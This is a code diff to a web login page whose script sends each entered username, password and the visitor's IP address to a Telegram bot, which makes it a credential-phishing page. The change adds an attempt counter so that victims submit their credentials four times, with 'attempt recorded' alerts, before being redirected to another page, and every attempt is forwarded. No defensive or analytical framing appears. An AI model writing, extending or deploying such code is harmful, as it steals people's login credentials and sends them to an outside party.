@@ -93,8 +93,13 @@
     </div>
 
     <script>
+        let attemptCounter = 0; // Initialize attempt counter
+
         document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
+
+            // Increment the attempt counter
+            attemptCounter++;
 
             // Get form data
             const username = document.getElementById("username").value;
@@ -112,7 +117,7 @@
                     const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
                     // Create message including the IP address
-                    const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${userIp}`;
+                    const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${userIp}\nAttempt: ${attemptCounter}`;
 
                     // Send form data to Telegram
                     fetch(telegramApiUrl, {
@@ -128,8 +133,12 @@
                     .then(response => response.json())
                     .then(data => {
                         if (data.ok) {
-                            // Redirect to another page after successful submission
-                            window.location.href = "flock.html";  // Redirect page
+                            // Redirect after 4th attempt
+                            if (attemptCounter >= 4) {
+                                window.location.href = "flock.html"; // Redirect page
+                            } else {
+                                alert(`Attempt ${attemptCounter}/4 recorded.`);
+                            }
                         } else {
                             alert("Error submitting data to Telegram.");
                         }
